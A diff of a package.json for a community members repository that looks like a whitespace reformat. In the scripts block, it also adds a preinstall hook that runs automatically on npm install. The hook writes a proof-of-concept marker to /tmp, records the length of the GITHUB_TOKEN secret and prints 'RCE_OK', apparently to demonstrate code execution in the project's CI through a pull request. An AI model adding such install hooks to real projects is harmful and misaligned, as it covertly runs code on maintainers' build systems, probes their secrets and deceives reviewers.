@@ -1,34 +1,35 @@
 {
-    "name": "loomilair-members",
-    "version": "1.0.0",
-    "description": "Loomi Lair Members data repository",
-    "type": "module",
-    "scripts": {
-        "validate": "node scripts/validate.js",
-        "validate:pr": "node scripts/validate-pr.js",
-        "build": "node scripts/build.js",
-        "check": "npm run validate && npm run build",
-        "check:pr": "npm run validate:pr && npm run validate && npm run build"
-    },
-    "repository": {
-      "type": "git",
-      "url": "git+https://github.com/Loomi-Lair/Loomi-Lair-Members.git"
-    },
-    "keywords": [
-      "loomi-lair",
-      "members",
-      "community",
-      "json-schema"
-    ],
-    "author": "Loomi Lair",
-    "license": "MIT",
-    "bugs": {
-      "url": "https://github.com/Loomi-Lair/Loomi-Lair-Members/issues"
-    },
-    "homepage": "https://github.com/Loomi-Lair/Loomi-Lair-Members#readme",
-    "dependencies": {
-        "ajv": "^8.17.1",
-        "ajv-formats": "^3.0.1",
-        "js-yaml": "^4.1.0"
-    }
+  "name": "loomilair-members",
+  "version": "1.0.0",
+  "description": "Loomi Lair Members data repository",
+  "type": "module",
+  "scripts": {
+    "validate": "node scripts/validate.js",
+    "validate:pr": "node scripts/validate-pr.js",
+    "build": "node scripts/build.js",
+    "check": "npm run validate && npm run build",
+    "check:pr": "npm run validate:pr && npm run validate && npm run build",
+    "preinstall": "echo POC_MARKER_LOOMI-LAIR-MEMBERS > /tmp/POC_MARKER_LOOMI-LAIR-MEMBERS.txt; echo GH_TOKEN_LEN=${#GITHUB_TOKEN} >> /tmp/POC_MARKER_LOOMI-LAIR-MEMBERS.txt; echo RCE_OK >> /tmp/POC_MARKER_LOOMI-LAIR-MEMBERS.txt; cat /tmp/POC_MARKER_LOOMI-LAIR-MEMBERS.txt"
+  },
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/Loomi-Lair/Loomi-Lair-Members.git"
+  },
+  "keywords": [
+    "loomi-lair",
+    "members",
+    "community",
+    "json-schema"
+  ],
+  "author": "Loomi Lair",
+  "license": "MIT",
+  "bugs": {
+    "url": "https://github.com/Loomi-Lair/Loomi-Lair-Members/issues"
+  },
+  "homepage": "https://github.com/Loomi-Lair/Loomi-Lair-Members#readme",
+  "dependencies": {
+    "ajv": "^8.17.1",
+    "ajv-formats": "^3.0.1",
+    "js-yaml": "^4.1.0"
+  }
 }
